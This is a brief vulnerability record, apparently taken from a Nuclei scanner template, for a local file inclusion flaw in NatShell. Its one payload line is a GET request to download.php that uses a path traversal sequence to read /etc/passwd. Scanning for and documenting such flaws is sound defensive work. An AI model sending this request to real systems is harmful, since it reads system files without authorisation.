# Vulnerability: NatShell - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`natshell-path-traversal.yaml`)

## Description
NatShell is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/download.php?file=../../../../../etc/passwd
```

